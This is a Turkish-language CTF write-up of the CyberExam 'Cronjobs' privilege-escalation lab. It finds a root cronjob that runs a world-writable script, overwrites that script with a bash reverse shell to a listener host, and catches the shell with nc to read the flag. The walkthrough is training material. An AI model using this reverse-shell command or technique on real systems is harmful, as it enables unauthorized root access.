---
title: "CyberExam: Cronjobs Challenge"
author: b1lal
categories: [CyberExam]
tags: [linux, privilege escalation, cronjob]
render_with_liquid: false
media_subpath: /images/cyberexam_challenges_cronjob/
image:
  path: cron.png
---

**Cronjobs** challenge'ı basit-orta seviye bir yetki yükseltme odasıdır. Amacımız sistemde ayarlanmış olan cronjob'ı kullanarak yetki yükselterek kök dizindeki ***flag.txt*** dosyasını okumaktır. (*Aşağıdaki görsele tıklarsanız doğrudan challenge sayfasına yönlendirilirsiniz.*)

[![CyberExam Challenge Link](challenge.png){: width="750" height="750" .shadow}](https://learn.cyberexam.io/challenges/privilege-escalation/linux/cronjobs){: .center }

Bu challenge bizden iki soruya cevap vermemizi istiyor:
- Planlanan cronjob nedir ? (fullpath)
- **flag.txt** dosyasının içeriği nedir ?

Challenge'ı başlatıyoruz, birkaç dakika sonra başlıyor. 


## Cronjob Dosyasını Bulma

Burada ilk yaptığımız vakit kaybetmeden zamanlanmış görev olup olmadığını kontrol etmektir.


```console
┌──(user㉿ubuntu)-[~]
└─$ cat /etc/crontab  
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab`  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  

SHELL=/bin/sh  
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  

# Example of job definition:  
# .---------------- minute (0 - 59)  
# |  .------------- hour (0 - 23)  
# |  |  .---------- day of month (1 - 31)  
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...  
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat  
# |  |  |  |  |  
# *  *  *  *  * user-name command to be executed  
*/1 *  *  *  *  root  /tmp/cleanup.sh
17  *  *  *  *  root  cd / && run-parts --report /etc/cron.hourly  
25  6  *  *  *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47  6  *  *  7  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52  6  1  *  *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
```

<br>
<br>

Burada gözümüze doğrudan cleanup.sh dosyası çarpıyor. Bunu biraz daha detaylı inceleyelim.

```bash
*/1 * * * * root /tmp/cleanup.sh
```


## Crontab Dosyasının Özellikleri

### Zamanlama Bölümü (`*/1 * * * *`)

Crontab satırları, zamanlama bilgisi içeren **beş alandan** oluşur:


| Dakika (0-59) | Saat (0-23) | Gün (1-31) | Ay (1-12) | Hafta Günü (0-6, Pazar=0 veya 7) |
| :-----------: | :---------: | :--------: | :-------: | :------------------------------: |
|     `*/1`     |     `*`     |    `*`     |    `*`    |               `*`                |




<br>

- **`*/1`** → Her **1 dakikada bir** çalıştır.
- **`*` (diğerleri)** → **Her saat, her gün, her ay ve her hafta günü** çalıştır.

Bu nedenle, bu görev **her dakika çalışacaktır**.

---

### Kullanıcı Bölümü (`root`)

- **`root`** → Bu komut **root kullanıcısı** tarafından çalıştırılacaktır.
- `/etc/crontab` gibi sistem genelindeki crontab dosyalarında kullanıcı adı **belirtilmelidir**.

---

<br>

## Yetki Yükseltme

Şimdi bu dosyaya yazma hakkımızın olup olmadığını kontrol edelim.

```bash
┌──(user㉿ubuntu)-[~]
└─$ ls -l /tmp/cleanup.sh
-rwxrw-rw- 1 root root 36 Aug 25 2023 /tmp/cleanup.sh
```

Yazma hakkımızın olduğunu görüyoruz. Şimdi dosyanın içeriğini reverse shell alabileceğimiz şekilde değiştirelim.

```bash
┌──(user㉿ubuntu)-[~]
└─$ vim /tmp/cleanup.sh
```

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.0.1.2/2828 0>&1
```
{: file="cleanup.sh" }

Daha sonra verdiğimiz portu dinlemeye başlıyoruz.

```bash
┌──(user㉿ubuntu)-[~]
└─$ nc -nvlp 2828
```

```bash
listening on [any] 2828 ...
connect to [10.0.1.2] from (UNKNOWN) [10.0.1.2] 46052
bash: cannot set terminal process group (461): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:~#
```

Kısa bir süre sonra nc dinleyicimize bağlantı düşüyor. Şimdi **flag.txt** dosyasını okuyabiliriz.

```bash
┌──(user㉿ubuntu)-[~]
└─$ cat /flag.txt
cat /flag.txt
CyberPath{CENSORED}
```
<br>

İlk challenge'ımızı başarıyla tamamladık. Bir sonra yazılarda görüşmek üzere.

![Challenge Finished](challenge-finish.png){: width="1000" height="700"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
